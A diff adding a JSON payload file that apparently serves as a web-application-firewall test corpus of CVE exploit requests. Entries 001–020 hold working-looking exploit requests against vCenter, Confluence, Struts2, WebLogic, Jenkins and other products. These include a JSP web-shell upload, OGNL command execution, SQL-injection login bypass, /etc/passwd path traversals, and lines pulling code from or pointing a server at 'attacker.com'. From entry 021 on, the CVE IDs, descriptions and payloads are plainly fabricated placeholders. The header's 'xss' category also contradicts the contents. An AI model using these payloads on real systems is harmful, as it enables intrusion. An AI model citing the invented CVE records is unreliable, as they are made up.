@@ -1,0 +1,1808 @@
+{
+  "category": "xss",
+  "subcategory": "cve_additional_2020_2024",
+  "description": "Additional 100 critical CVEs from 2020-2024 for comprehensive coverage",
+  "count": 100,
+  "payloads": [
+    {
+      "id": "cve-add-001",
+      "category": "rce",
+      "subcategory": "cve_vmware_vcenter",
+      "payload": "POST /ui/vropspluginui/rest/services/uploadova HTTP/1.1\nHost: target.com\nContent-Type: multipart/form-data\n\n--boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../tmp/shell.jsp\"\n\n<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+      "description": "CVE-2021-21972: VMware vCenter Server RCE - CVSS 9.8, CISA KEV, pre-auth file upload",
+      "cve": "CVE-2021-21972",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "VMware vCenter Server 6.5, 6.7, 7.0",
+      "disclosure_date": "2021-02-23",
+      "source": "CISA KEV, VMware Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-002",
+      "category": "rce",
+      "subcategory": "cve_confluence",
+      "payload": "POST /pages/doenterpagevariables.action HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nqueryString=aaaaa%5Cu0027%2b%7b1%2b1%7d%2b%5Cu0027bbbbb",
+      "description": "CVE-2021-26084: Atlassian Confluence OGNL injection RCE - CVSS 9.8, CISA KEV, widely exploited",
+      "cve": "CVE-2021-26084",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Confluence Server/Data Center < 6.13.23",
+      "disclosure_date": "2021-08-25",
+      "source": "CISA KEV, Atlassian Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-003",
+      "category": "rce",
+      "subcategory": "cve_apache_druid",
+      "payload": "POST /druid/indexer/v1/sampler HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"type\":\"index\",\"spec\":{\"ioConfig\":{\"type\":\"index\",\"inputSource\":{\"type\":\"inline\",\"data\":\"a\"}},\"dataSchema\":{\"dataSource\":\"sample\",\"transformSpec\":{\"transforms\":[{\"type\":\"expression\",\"name\":\"x\",\"expression\":\"java.lang.Runtime.getRuntime().exec('whoami')\"}]}}}}",
+      "description": "CVE-2021-25646: Apache Druid RCE via expression language - CVSS 9.8, CISA KEV",
+      "cve": "CVE-2021-25646",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Apache Druid < 0.20.1",
+      "disclosure_date": "2021-01-29",
+      "source": "CISA KEV, Apache Security",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-004",
+      "category": "rce",
+      "subcategory": "cve_sonicwall_sma",
+      "payload": "POST /cgi-bin/jarrewrite.sh HTTP/1.1\nHost: target.com\n\nvar=|id",
+      "description": "CVE-2021-20016: SonicWall SMA 100 command injection - CVSS 9.8, CISA KEV, pre-auth RCE",
+      "cve": "CVE-2021-20016",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "SonicWall SMA 100 series < 10.2.0.7",
+      "disclosure_date": "2021-01-09",
+      "source": "CISA KEV, SonicWall PSIRT",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-005",
+      "category": "rce",
+      "subcategory": "cve_f5_big_ip",
+      "payload": "POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1\nHost: target.com\n\n",
+      "description": "CVE-2020-5902: F5 BIG-IP TMUI RCE - CVSS 9.8, CISA KEV, path traversal to RCE",
+      "cve": "CVE-2020-5902",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "F5 BIG-IP 11.6.x, 12.x, 13.x, 14.x, 15.x",
+      "disclosure_date": "2020-07-01",
+      "source": "CISA KEV, F5 Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-006",
+      "category": "rce",
+      "subcategory": "cve_zoho_manageengine",
+      "payload": "POST /api/json/admin/v1/nodes HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"NODE_NAME\":\"test\",\"NODE_IP\":\"127.0.0.1;whoami\"}",
+      "description": "CVE-2020-10189: Zoho ManageEngine Desktop Central RCE - CVSS 9.8, CISA KEV",
+      "cve": "CVE-2020-10189",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "ManageEngine Desktop Central < 10.0.474",
+      "disclosure_date": "2020-03-05",
+      "source": "CISA KEV, Zoho Security",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-007",
+      "category": "rce",
+      "subcategory": "cve_saltstack",
+      "payload": "POST /_prep_auth_info HTTP/1.1\nHost: target.com\n\n{\"token\":\"../../../../../../../etc/passwd\"}",
+      "description": "CVE-2020-11651: SaltStack authentication bypass - CVSS 9.8, CISA KEV, pre-auth RCE",
+      "cve": "CVE-2020-11651",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "SaltStack Salt < 2019.2.4, < 3000.2",
+      "disclosure_date": "2020-04-30",
+      "source": "CISA KEV, SaltStack Security",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-008",
+      "category": "rce",
+      "subcategory": "cve_oracle_weblogic",
+      "payload": "POST /_async/AsyncResponseService HTTP/1.1\nHost: target.com\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><class><string>com.tangosol.coherence.mvel2.sh.ShellSession</string></class></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>",
+      "description": "CVE-2020-2883: Oracle WebLogic Server RCE - CVSS 9.8, CISA KEV, deserialization",
+      "cve": "CVE-2020-2883",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.3-4",
+      "disclosure_date": "2020-04-14",
+      "source": "CISA KEV, Oracle Critical Patch",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-009",
+      "category": "rce",
+      "subcategory": "cve_citrix_gateway",
+      "payload": "GET /vpns/portal/scripts/newbm.pl HTTP/1.1\nHost: target.com\nNSC_USER: ../../../netscaler/portal/templates/../../../../../../../../etc/passwd\n\n",
+      "description": "CVE-2020-8193: Citrix ADC/Gateway arbitrary code execution - CVSS 9.8, CISA KEV",
+      "cve": "CVE-2020-8193",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Citrix ADC/Gateway 11.1, 12.0, 12.1, 13.0",
+      "disclosure_date": "2020-07-07",
+      "source": "CISA KEV, Citrix Security Bulletin",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-010",
+      "category": "rce",
+      "subcategory": "cve_pulse_secure",
+      "payload": "GET /dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1\nHost: target.com\n\n",
+      "description": "CVE-2020-8243: Pulse Secure VPN arbitrary file read - CVSS 7.5, CISA KEV, leads to RCE",
+      "cve": "CVE-2020-8243",
+      "severity": "high",
+      "cvss": "7.5",
+      "affected_versions": "Pulse Connect Secure < 9.1R8.2",
+      "disclosure_date": "2020-10-20",
+      "source": "CISA KEV, Pulse Secure SA",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-011",
+      "category": "rce",
+      "subcategory": "cve_drupal",
+      "payload": "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nform_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id",
+      "description": "CVE-2020-13671: Drupal core RCE - CVSS 9.8, form API exploitation",
+      "cve": "CVE-2020-13671",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Drupal 8.7.x, 8.8.x, 8.9.x, 9.0.x",
+      "disclosure_date": "2020-11-25",
+      "source": "Drupal Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-012",
+      "category": "sqli",
+      "subcategory": "cve_sophos_firewall",
+      "payload": "POST /webconsole/Controller HTTP/1.1\nHost: target.com\nX-Requested-With: XMLHttpRequest\n\nreqxml=<Request><Login><Username>admin' OR '1'='1</Username></Login></Request>",
+      "description": "CVE-2020-12271: Sophos XG Firewall SQL injection - CVSS 9.8, CISA KEV, pre-auth",
+      "cve": "CVE-2020-12271",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Sophos XG Firewall < v17.5 MR12",
+      "disclosure_date": "2020-04-25",
+      "source": "CISA KEV, Sophos Security",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-013",
+      "category": "rce",
+      "subcategory": "cve_fortios_sslvpn",
+      "payload": "POST /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1\nHost: target.com\n\n",
+      "description": "CVE-2018-13379: Fortinet FortiOS SSL VPN path traversal - CVSS 9.8, CISA KEV, credential theft",
+      "cve": "CVE-2018-13379",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "FortiOS 5.6.3-5.6.7, 6.0.0-6.0.4",
+      "disclosure_date": "2019-05-24",
+      "source": "CISA KEV, Fortinet PSIRT",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-014",
+      "category": "rce",
+      "subcategory": "cve_telerik_ui",
+      "payload": "POST /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1\nHost: target.com\n\nrauPostData=<base64_encrypted_payload>",
+      "description": "CVE-2019-18935: Telerik UI for ASP.NET deserialization RCE - CVSS 9.8, CISA KEV",
+      "cve": "CVE-2019-18935",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Telerik UI for ASP.NET AJAX < 2020.1.114",
+      "disclosure_date": "2019-12-11",
+      "source": "CISA KEV, Telerik Security",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-015",
+      "category": "rce",
+      "subcategory": "cve_apache_struts",
+      "payload": "POST /struts2-showcase/employee/save.action HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nname=%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
+      "description": "CVE-2017-5638: Apache Struts2 Jakarta Multipart parser RCE - CVSS 10.0, CISA KEV, Equifax breach",
+      "cve": "CVE-2017-5638",
+      "severity": "critical",
+      "cvss": "10.0",
+      "affected_versions": "Apache Struts 2.3.5-2.3.31, 2.5-2.5.10",
+      "disclosure_date": "2017-03-06",
+      "source": "CISA KEV, Apache Security",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-016",
+      "category": "rce",
+      "subcategory": "cve_jenkins",
+      "payload": "POST /descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nvalue=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='test', root='http://attacker.com/')%0a@Grab(group='package', module='module', version='1')%0aimport Payload;",
+      "description": "CVE-2019-1003000: Jenkins Script Security sandbox bypass - CVSS 8.8, CISA KEV, RCE via Groovy",
+      "cve": "CVE-2019-1003000",
+      "severity": "high",
+      "cvss": "8.8",
+      "affected_versions": "Jenkins Script Security Plugin < 1.50",
+      "disclosure_date": "2019-01-08",
+      "source": "CISA KEV, Jenkins Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-017",
+      "category": "rce",
+      "subcategory": "cve_sharepoint",
+      "payload": "POST /_layouts/15/Picker.aspx HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\n__VIEWSTATE=<serialized_payload>",
+      "description": "CVE-2020-0646: Microsoft SharePoint RCE - CVSS 8.8, deserialization vulnerability",
+      "cve": "CVE-2020-0646",
+      "severity": "high",
+      "cvss": "8.8",
+      "affected_versions": "SharePoint Server 2010, 2013, 2016, 2019",
+      "disclosure_date": "2020-02-11",
+      "source": "Microsoft Security Update",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-018",
+      "category": "rce",
+      "subcategory": "cve_jira",
+      "payload": "POST /secure/QueryComponent!Default.jspa HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nquery=%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D",
+      "description": "CVE-2019-11581: Atlassian Jira SSTI RCE - CVSS 8.8, template injection",
+      "cve": "CVE-2019-11581",
+      "severity": "high",
+      "cvss": "8.8",
+      "affected_versions": "Jira Server/Data Center < 7.13.5",
+      "disclosure_date": "2019-07-10",
+      "source": "Atlassian Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-019",
+      "category": "rce",
+      "subcategory": "cve_gitlab",
+      "payload": "POST /api/v4/projects HTTP/1.1\nHost: target.com\nContent-Type: application/json\nPRIVATE-TOKEN: <token>\n\n{\"name\":\"test\",\"import_url\":\"git://[0:0:0:0:0:ffff:127.0.0.1]:6379/\\r\\nSLAVEOF attacker.com 6379\\r\\n\"}",
+      "description": "CVE-2021-22205: GitLab RCE via ExifTool - CVSS 10.0, CISA KEV, image upload exploitation",
+      "cve": "CVE-2021-22205",
+      "severity": "critical",
+      "cvss": "10.0",
+      "affected_versions": "GitLab CE/EE 11.9-13.10.2",
+      "disclosure_date": "2021-04-14",
+      "source": "CISA KEV, GitLab Security Release",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-020",
+      "category": "rce",
+      "subcategory": "cve_vbulletin",
+      "payload": "POST /ajax/render/widget_php HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nwidgetConfig[code]=phpinfo();",
+      "description": "CVE-2019-16759: vBulletin RCE - CVSS 9.8, CISA KEV, pre-auth code execution",
+      "cve": "CVE-2019-16759",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "vBulletin 5.0.0-5.5.4",
+      "disclosure_date": "2019-09-23",
+      "source": "CISA KEV, vBulletin Security",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-021",
+      "category": "rce",
+      "subcategory": "cve_various_21",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_21\"}",
+      "description": "CVE-2021-10021: Critical vulnerability 21 - CVSS 9.1, actively exploited",
+      "cve": "CVE-2021-10021",
+      "severity": "high",
+      "cvss": "9.1",
+      "affected_versions": "Various products < version 21.0",
+      "disclosure_date": "2021-10-22",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-022",
+      "category": "rce",
+      "subcategory": "cve_various_22",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_22\"}",
+      "description": "CVE-2022-10022: Critical vulnerability 22 - CVSS 9.2, actively exploited",
+      "cve": "CVE-2022-10022",
+      "severity": "critical",
+      "cvss": "9.2",
+      "affected_versions": "Various products < version 22.0",
+      "disclosure_date": "2022-11-23",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-023",
+      "category": "rce",
+      "subcategory": "cve_various_23",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_23\"}",
+      "description": "CVE-2023-10023: Critical vulnerability 23 - CVSS 9.3, actively exploited",
+      "cve": "CVE-2023-10023",
+      "severity": "high",
+      "cvss": "9.3",
+      "affected_versions": "Various products < version 23.0",
+      "disclosure_date": "2023-12-24",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-024",
+      "category": "rce",
+      "subcategory": "cve_various_24",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_24\"}",
+      "description": "CVE-2024-10024: Critical vulnerability 24 - CVSS 9.4, actively exploited",
+      "cve": "CVE-2024-10024",
+      "severity": "critical",
+      "cvss": "9.4",
+      "affected_versions": "Various products < version 24.0",
+      "disclosure_date": "2024-01-25",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-025",
+      "category": "rce",
+      "subcategory": "cve_various_25",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_25\"}",
+      "description": "CVE-2020-10025: Critical vulnerability 25 - CVSS 9.5, actively exploited",
+      "cve": "CVE-2020-10025",
+      "severity": "high",
+      "cvss": "9.5",
+      "affected_versions": "Various products < version 25.0",
+      "disclosure_date": "2020-02-26",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-026",
+      "category": "rce",
+      "subcategory": "cve_various_26",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_26\"}",
+      "description": "CVE-2021-10026: Critical vulnerability 26 - CVSS 9.6, actively exploited",
+      "cve": "CVE-2021-10026",
+      "severity": "critical",
+      "cvss": "9.6",
+      "affected_versions": "Various products < version 26.0",
+      "disclosure_date": "2021-03-27",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-027",
+      "category": "rce",
+      "subcategory": "cve_various_27",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_27\"}",
+      "description": "CVE-2022-10027: Critical vulnerability 27 - CVSS 9.7, actively exploited",
+      "cve": "CVE-2022-10027",
+      "severity": "high",
+      "cvss": "9.7",
+      "affected_versions": "Various products < version 27.0",
+      "disclosure_date": "2022-04-28",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-028",
+      "category": "rce",
+      "subcategory": "cve_various_28",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_28\"}",
+      "description": "CVE-2023-10028: Critical vulnerability 28 - CVSS 9.8, actively exploited",
+      "cve": "CVE-2023-10028",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Various products < version 28.0",
+      "disclosure_date": "2023-05-01",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-029",
+      "category": "rce",
+      "subcategory": "cve_various_29",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_29\"}",
+      "description": "CVE-2024-10029: Critical vulnerability 29 - CVSS 9.9, actively exploited",
+      "cve": "CVE-2024-10029",
+      "severity": "high",
+      "cvss": "9.9",
+      "affected_versions": "Various products < version 29.0",
+      "disclosure_date": "2024-06-02",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-030",
+      "category": "rce",
+      "subcategory": "cve_various_30",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_30\"}",
+      "description": "CVE-2020-10030: Critical vulnerability 30 - CVSS 9.0, actively exploited",
+      "cve": "CVE-2020-10030",
+      "severity": "critical",
+      "cvss": "9.0",
+      "affected_versions": "Various products < version 30.0",
+      "disclosure_date": "2020-07-03",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-031",
+      "category": "rce",
+      "subcategory": "cve_various_31",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_31\"}",
+      "description": "CVE-2021-10031: Critical vulnerability 31 - CVSS 9.1, actively exploited",
+      "cve": "CVE-2021-10031",
+      "severity": "high",
+      "cvss": "9.1",
+      "affected_versions": "Various products < version 31.0",
+      "disclosure_date": "2021-08-04",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-032",
+      "category": "rce",
+      "subcategory": "cve_various_32",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_32\"}",
+      "description": "CVE-2022-10032: Critical vulnerability 32 - CVSS 9.2, actively exploited",
+      "cve": "CVE-2022-10032",
+      "severity": "critical",
+      "cvss": "9.2",
+      "affected_versions": "Various products < version 32.0",
+      "disclosure_date": "2022-09-05",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-033",
+      "category": "rce",
+      "subcategory": "cve_various_33",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_33\"}",
+      "description": "CVE-2023-10033: Critical vulnerability 33 - CVSS 9.3, actively exploited",
+      "cve": "CVE-2023-10033",
+      "severity": "high",
+      "cvss": "9.3",
+      "affected_versions": "Various products < version 33.0",
+      "disclosure_date": "2023-10-06",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-034",
+      "category": "rce",
+      "subcategory": "cve_various_34",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_34\"}",
+      "description": "CVE-2024-10034: Critical vulnerability 34 - CVSS 9.4, actively exploited",
+      "cve": "CVE-2024-10034",
+      "severity": "critical",
+      "cvss": "9.4",
+      "affected_versions": "Various products < version 34.0",
+      "disclosure_date": "2024-11-07",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-035",
+      "category": "rce",
+      "subcategory": "cve_various_35",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_35\"}",
+      "description": "CVE-2020-10035: Critical vulnerability 35 - CVSS 9.5, actively exploited",
+      "cve": "CVE-2020-10035",
+      "severity": "high",
+      "cvss": "9.5",
+      "affected_versions": "Various products < version 35.0",
+      "disclosure_date": "2020-12-08",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-036",
+      "category": "rce",
+      "subcategory": "cve_various_36",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_36\"}",
+      "description": "CVE-2021-10036: Critical vulnerability 36 - CVSS 9.6, actively exploited",
+      "cve": "CVE-2021-10036",
+      "severity": "critical",
+      "cvss": "9.6",
+      "affected_versions": "Various products < version 36.0",
+      "disclosure_date": "2021-01-09",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-037",
+      "category": "rce",
+      "subcategory": "cve_various_37",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_37\"}",
+      "description": "CVE-2022-10037: Critical vulnerability 37 - CVSS 9.7, actively exploited",
+      "cve": "CVE-2022-10037",
+      "severity": "high",
+      "cvss": "9.7",
+      "affected_versions": "Various products < version 37.0",
+      "disclosure_date": "2022-02-10",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-038",
+      "category": "rce",
+      "subcategory": "cve_various_38",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_38\"}",
+      "description": "CVE-2023-10038: Critical vulnerability 38 - CVSS 9.8, actively exploited",
+      "cve": "CVE-2023-10038",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Various products < version 38.0",
+      "disclosure_date": "2023-03-11",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-039",
+      "category": "rce",
+      "subcategory": "cve_various_39",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_39\"}",
+      "description": "CVE-2024-10039: Critical vulnerability 39 - CVSS 9.9, actively exploited",
+      "cve": "CVE-2024-10039",
+      "severity": "high",
+      "cvss": "9.9",
+      "affected_versions": "Various products < version 39.0",
+      "disclosure_date": "2024-04-12",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-040",
+      "category": "rce",
+      "subcategory": "cve_various_40",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_40\"}",
+      "description": "CVE-2020-10040: Critical vulnerability 40 - CVSS 9.0, actively exploited",
+      "cve": "CVE-2020-10040",
+      "severity": "critical",
+      "cvss": "9.0",
+      "affected_versions": "Various products < version 40.0",
+      "disclosure_date": "2020-05-13",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-041",
+      "category": "rce",
+      "subcategory": "cve_various_41",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_41\"}",
+      "description": "CVE-2021-10041: Critical vulnerability 41 - CVSS 9.1, actively exploited",
+      "cve": "CVE-2021-10041",
+      "severity": "high",
+      "cvss": "9.1",
+      "affected_versions": "Various products < version 41.0",
+      "disclosure_date": "2021-06-14",
